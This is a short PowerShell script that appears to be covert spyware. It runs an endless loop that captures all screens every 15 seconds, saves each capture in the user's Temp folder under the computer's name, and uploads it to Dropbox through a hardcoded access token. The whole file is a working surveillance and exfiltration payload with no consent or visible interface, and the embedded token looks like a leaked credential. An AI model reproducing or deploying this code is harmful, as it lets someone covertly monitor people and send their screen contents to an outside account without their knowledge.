function Dup {

[CmdletBinding()]
param (
    
[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
[Alias("f")]
[string]$SourceFilePath
) 
$DropBoxAccessToken = "sl.u.AFyrNZWrgIKRtHAzCUwTGrFZ09f2imgCwuBj3yr3kDHyiu2AQBJjzii4vxIcUKPeyJgrsCkE8f93HkLAby-r3lIUrcj7uN5WGpyDeh7KSxfU4HPeVDG9mJkKamY73kx2s45TjXpRd8oxnaExUfcSmn3w47RBJ_dKy14zcyv9K_CrxKnO0k_e1OsY_uYK1WhBeq_AJ1KmmDVETTJoGvrgZzD6VPIIpOSysS1uhimzVoAvvOrCBgrehFJ0-OTD3AI5E9E9pBStwP_wm4NzUckCAW5lY7oWAZ35jxDRXNqtLclosOOaRE9_W17neaqVrYXtCng7A2zAZiZauUpX9bSf8yCB1hqoDAhYPG93QskAkITulDMl9qXjdRbubjxdsS-nMwTby0J9mDrK9syovivmX6DSV2ouQqgsVadNHoIjsb-qgubhaJymKT6Ys_lr7I8UpaleYJz3DHblNNFemmlf_-xg9nMYlV5NsA9TqQzNtpq4ZRu-Py9MQoTQLaBpnm7GOAXx1R80Lyd5K_A43VyKKEpBQ-x1Z25xZNvKzuITBeY1dj5sVtPChY_UWRIvID_-0AA0p7O3_bjGc-1Zl_1g8jlyVfd-7hJKI8pv7loFSeKTRaFfcRVFlnMDgULreQoMTpow9GK1fwXzC6KEDzcr_2oCNyt7mg5mkTIxZgZ0nonvJl-_evHdKwcUG_hzizoEIYlNC-EB6OJGKpAD_52T9-N5YmagxsBMMq6lJvy6rNGzsGHL6GbGb6dkUnT2k5eMLwERwmRiNBDw6sjcSY1YkrKBRINYEAlETBvFDs4E-1kP4_6s4cUeQi0x1MMRKTV-BbC8B-lx35prmFYygYbJm-S11hFtfP3LpDGRLtINjgenIerk-WecABhnbBpnpyY9UKFEZstIMOfG5DjLvWEEr5lVUUVb-U22d_qeJp3ucIphLbfX-_trf2B88dPbSpGhznT-o12t5W9WFZc0yfR_Fua2F4lj5KrvbIYidzYatEDor3rcaraPdN8RW2CU7s2VK3tG5kslm3IcnMlQpf0HB7WcvFBnEe3x36_ryCR5BcKrFuZsdRQjCFz6ftH56hDjtOdTQUVrFlvKuuY4fU27i3nbgu_hqPBCgZPISokWi2-cz87tdz0SA9EcT6gbOcdIdyBAJCRuAo6rQHFV663Dpc9hVuLJAfmGBgMeFCSLYT6MYKf9iarg5luW9f05Vvr9QASb5A71u72KoHOHJOqAAA1XoCIiWAfMqoqjvawVXx9nofPtgLsd4HQMgULeJJnfbFdEGwgQG-EmTUKgWVbJpAtrr_s5wSo6F8AsHdX2yf49nCJO3KV6xED2iUBOWwdluyWPinw8fbv_cNlu6OLLaUKYaCRdqnyLsiaygAGTCnOB-neGidrt1LYNJ5zP1s59vT7nPVncMaRDbqs1E8FRbnQX"   # Replace with your DropBox Access Token
$outputFile = Split-Path $SourceFilePath -leaf
$TargetFilePath="/$outputFile"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $DropBoxAccessToken
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

while(1){

  Add-Type -AssemblyName System.Windows.Forms,System.Drawing

  $screens = [Windows.Forms.Screen]::AllScreens

  $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
  $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
  $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
  $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum

  $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
  $bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.width), ([int]$bounds.height)
  $graphics = [Drawing.Graphics]::FromImage($bmp)

  $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

  $bmp.Save("$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png")
  $graphics.Dispose()
  $bmp.Dispose()
  
  start-sleep -Seconds 15
 "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png" | Dup
}
